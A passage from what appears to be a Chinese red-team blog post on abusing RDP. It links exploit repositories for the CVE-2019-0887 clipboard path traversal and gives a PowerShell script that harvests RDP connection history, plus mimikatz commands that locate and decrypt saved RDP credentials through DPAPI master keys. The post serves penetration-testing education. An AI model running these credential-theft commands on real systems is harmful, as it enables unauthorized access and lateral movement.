+<p>3、要求服务器上的 rdpclip.exe 进程提供剪贴板的内容，并将其转换为 FileGroupDescriptor(Fgd) 剪贴板格式</p>
+<p>4、使用 HdropToFgdConverter::AddItemToFgd() 函数，将文件的元数据添加到描述符中</p>
+<p>5、完成后，将 Fgd Blob 发送到服务器上的 RDP 服务</p>
+<p>6、服务器只是将其包装并将其发送给客户端</p>
+<p>7、客户端将其解包并将其存储在自己的剪贴板中</p>
+<p>8、「粘贴」事件将发送到当前窗口（例如，explorer.exe）</p>
+<p>9、处理事件并从剪贴板读取数据</p>
+<p>10、通过 RDP 连接接收文件的内容</p>
+<h4 id="522-利用">5.2.2 利用</h4>
+<ul>
+<li>
+<p><a href="https://github.com/qianshuidewajueji/CVE-2019-0887" target="_blank" rel="noopener noreffer">https://github.com/qianshuidewajueji/CVE-2019-0887</a></p>
+</li>
+<li>
+<p><a href="https://github.com/0xedh/mstsc-path-traversal" target="_blank" rel="noopener noreffer">https://github.com/0xedh/mstsc-path-traversal</a></p>
+</li>
+</ul>
+<h2 id="6-rdp-thief">6 RDP Thief</h2>
+<p>每次成功连接到远程主机时，RDP 客户端都会保存远程主机的名称（或IP地址）以及用于登陆的用户名。再次启动 mstsc.exe 时，可以直接从列表中选择远程 RDP 服务器的名称，并且客户端已自动填写用于登陆的用户名。</p>
+<h3 id="61-获取连接历史记录">6.1 获取连接历史记录</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="cm">&lt;#
+</span><span class="cm"></span><span class="sd">.SYNOPSIS</span><span class="cm">
+</span><span class="cm">This script will list the logged-in users&#39; RDP Connections History.
+</span><span class="cm">#&gt;</span>
+<span class="nv">$AllUser</span> <span class="p">=</span> <span class="nb">Get-WmiObject</span> <span class="n">-Class</span> <span class="n">Win32_UserAccount</span>
+<span class="k">foreach</span><span class="p">(</span><span class="nv">$User</span> <span class="k">in</span> <span class="nv">$AllUser</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="nv">$RegPath</span> <span class="p">=</span> <span class="s2">&#34;Registry::HKEY_USERS\&#34;</span><span class="p">+</span><span class="nv">$User</span><span class="p">.</span><span class="n">SID</span><span class="p">+</span><span class="s2">&#34;\Software\Microsoft\Terminal Server Client\Servers\&#34;</span>
+	<span class="nb">Write-Host</span> <span class="s2">&#34;User:&#34;</span><span class="nv">$User</span><span class="p">.</span><span class="n">Name</span>
+	<span class="nb">Write-Host</span> <span class="s2">&#34;SID:&#34;</span><span class="nv">$User</span><span class="p">.</span><span class="n">SID</span>
+	<span class="nb">Write-Host</span> <span class="s2">&#34;Status:&#34;</span><span class="nv">$User</span><span class="p">.</span><span class="n">Status</span>
+	<span class="k">Try</span>  
+    	<span class="p">{</span> 
+		<span class="nv">$QueryPath</span> <span class="p">=</span> <span class="nb">dir </span><span class="nv">$RegPath</span> <span class="n">-Name</span> <span class="n">-ErrorAction</span> <span class="n">Stop</span>
+	<span class="p">}</span>
+	<span class="k">Catch</span>
+	<span class="p">{</span>
+		<span class="nb">Write-Host</span> <span class="s2">&#34;No RDP Connections History&#34;</span>
+		<span class="nb">Write-Host</span> <span class="s2">&#34;----------------------------------&#34;</span>
+		<span class="k">continue</span>
+	<span class="p">}</span>
+	<span class="k">foreach</span><span class="p">(</span><span class="nv">$Name</span> <span class="k">in</span> <span class="nv">$QueryPath</span><span class="p">)</span>
+	<span class="p">{</span>   
+		<span class="k">Try</span>  
+    		<span class="p">{</span>  
+    			<span class="nv">$User</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="nv">$RegPath$Name</span> <span class="n">-ErrorAction</span> <span class="n">Stop</span><span class="p">).</span><span class="n">UsernameHint</span>
+    			<span class="nb">Write-Host</span> <span class="s2">&#34;User:&#34;</span><span class="nv">$User</span>
+    			<span class="nb">Write-Host</span> <span class="s2">&#34;Server:&#34;</span><span class="nv">$Name</span>
+    		<span class="p">}</span>
+    		<span class="k">Catch</span>  
+    		<span class="p">{</span>
+			<span class="nb">Write-Host</span> <span class="s2">&#34;No RDP Connections History&#34;</span>
+    		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="nb">Write-Host</span> <span class="s2">&#34;----------------------------------&#34;</span>	
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120352.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120352.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120352.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120352.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120352.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120352.png-water_print" /></p>
+<h3 id="62-破解-rdp-连接凭证">6.2 破解 RDP 连接凭证</h3>
+<p>破解 RDP 连接凭证的前提是用户在连接远程主机时勾选了保存保存凭证。</p>
+<ul>
+<li>查找本地的 Credentials
+<ul>
+<li><code>dir /a %userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
+</ul>
+</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120624.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120624.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120624.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120624.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120624.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120624.png-water_print" /></p>
+<ul>
+<li>使用 mimikatz 进行操作
+<ul>
+<li><code>mimikatz dpapi::cred /in:C:\Users\by\AppData\Local\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D</code></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : {ffc994a1-de8d-4304-9416-31e587f7a8ca}
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 00000030 - 48
+  szDescription      : Local Credential Data
+
+  algCrypt           : 00006610 - 26128 (CALG_AES_256)
+  dwAlgCryptLen      : 00000100 - 256
+  dwSaltLen          : 00000020 - 32
+  pbSalt             : 00fed8ca7ec6d44585dd1fbd8b57e77b6ab0cf318ec5d52d09fd0694ffb89ccb
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         :
+  algHash            : 0000800e - 32782 (CALG_SHA_512)
+  dwAlgHashLen       : 00000200 - 512
+  dwHmac2KeyLen      : 00000020 - 32
+  pbHmack2Key        : b49ef55f909fa503eda37ddc797c83c99df983920bfb4628e07aac5cb32bb530
+  dwDataLen          : 000000b0 - 176
+  pbData             : 4083f8f501b999a35c4aa57ce732bf52d30a6e604dac5a91b6fd3e65660c52a536025c5126f0d12b85044498deef08a8688b3459f49514ed6ae46271a1cb4cd0e70845d9b6beccbcbe85dead0fb7c80b4f7810add87b75c48592fcbfbbfd94fa4eee8004f8cf6d9619ef4b9af643f4c9ef0e8a2a5b0cd00530a5638cfd114fee4b735ac12eef2c7e6a0364845eb0ee4b3ab121e33324f8d5af48f3422bd47a76ab5e9e9e5a1a383e22fff8bf851b6a2a
+  dwSignLen          : 00000040 - 64
+  pbSign             : 7c8dbe7991c6af4d3bfc9f808790a0904738d0ca227bc2ee20ee26cbf06487dd2679e932b27ea0c0cbbe590ee6430641605d7001b2158c8873c5d6a09a9855a8
+</code></pre></td></tr></table>
+</div>
+</div><p>接下来需要使用的就是 guidMasterKey、pbData 数据。pbData 是凭据的加密数据，guidMasterKey 是凭据的 GUID</p>
+<ul>
+<li>使用 <code>sekurlsa::dpapi</code></li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120648.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120648.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120648.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120648.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120648.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120648.png-water_print" /></p>
+<p>根据目标凭据 <code>GUID:{ffc994a1-de8d-4304-9416-31e587f7a8ca}</code>找到其关联的 MasterKey，这个 <code>MasterKey</code> 就是加密凭据的密钥，即解密 <code>pbData</code> 所必须的东西。</p>
+<ul>
+<li>解密
+<ul>
+<li><code>dpapi::cred /in:C:\Users\by\AppData\Local\Microsoft\Credentials\AB07963F1A0A1CB56827E93395597FC6 /masterkey:e01320a53bf9d57da1163c7723a5b3901df5a3fc8e504fc021def2637d19d34c0084a3ac2a0daab3fb9af3f98c48a9a901627dc4b10db087cb357e1d2f8aa18c</code></li>
+</ul>
+</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120812.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120812.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120812.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120812.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120812.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210122120812.png-water_print" /></p>
+<p>参考：</p>
+<ul>
+<li>
+<p><a href="https://research.nccgroup.com/2020/05/06/tool-release-socks-over-rdp/" target="_blank" rel="noopener noreffer">https://research.nccgroup.com/2020/05/06/tool-release-socks-over-rdp/</a></p>
+</li>
+<li>
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%e6%b8%97%e9%80%8f%e6%8a%80%e5%b7%a7-%e4%bd%bf%e7%94%a8%e8%bf%9c%e7%a8%8b%e6%a1%8c%e9%9d%a2%e5%8d%8f%e8%ae%ae%e5%bb%ba%e7%ab%8b%e9%80%9a%e9%81%93/" target="_blank" rel="noopener noreffer">https://3gstudent.github.io/3gstudent.github.io/渗透技巧-使用远程桌面协议建立通道/</a></p>
+</li>
+<li>
+<p><a href="https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3" target="_blank" rel="noopener noreffer">https://posts.specterops.io/revisiting-remote-desktop-lateral-movement-8fb905cb46c3</a></p>
+</li>
+<li>
+<p><a href="https://github.com/0xthirteen/SharpRDP" target="_blank" rel="noopener noreffer">https://github.com/0xthirteen/SharpRDP</a></p>
+</li>
+<li>
+<p><a href="https://mp.weixin.qq.com/s?__biz=MzI5MDQ2NjExOQ==&amp;mid=2247492759&amp;idx=1&amp;sn=f6283f0eaa9104f61436a4e15552f2ba&amp;scene=21#wechat_redirect" target="_blank" rel="noopener noreffer">利用 mstsc 反向攻击思路整理</a></p>
+</li>
+<li>
+<p><a href="https://research.checkpoint.com/reverse-rdp-attack-code-execution-on-rdp-clients/" target="_blank" rel="noopener noreffer">https://research.checkpoint.com/reverse-rdp-attack-code-execution-on-rdp-clients/</a></p>
+</li>
+<li>
+<p><a href="https://paper.seebug.org/1074/" target="_blank" rel="noopener noreffer">https://paper.seebug.org/1074/</a></p>
+</li>
+</ul>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-01-22</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/" data-title="红蓝对抗中 RDP 协议的利用"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/" data-title="红蓝对抗中 RDP 协议的利用"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2021/01/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E4%B8%ADrdp%E5%8D%8F%E8%AE%AE%E7%9A%84%E5%88%A9%E7%94%A8/" data-title="红蓝对抗中 RDP 协议的利用"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a>,&nbsp;<a href="/tags/rdp/">RDP</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021/01/mssql%E6%B3%A8%E5%85%A5%E4%B8%8E%E6%8F%90%E6%9D%83%E6%96%B9%E6%B3%95%E6%95%B4%E7%90%86/" class="prev" rel="prev" title="MSSQL 注入与提权方法整理"><i class="fas fa-angle-left fa-fw"></i>MSSQL 注入与提权方法整理</a>
+            <a href="/2021/01/windows%E6%8F%90%E6%9D%83%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/" class="next" rel="next" title="Windows 提权方式总结">Windows 提权方式总结<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
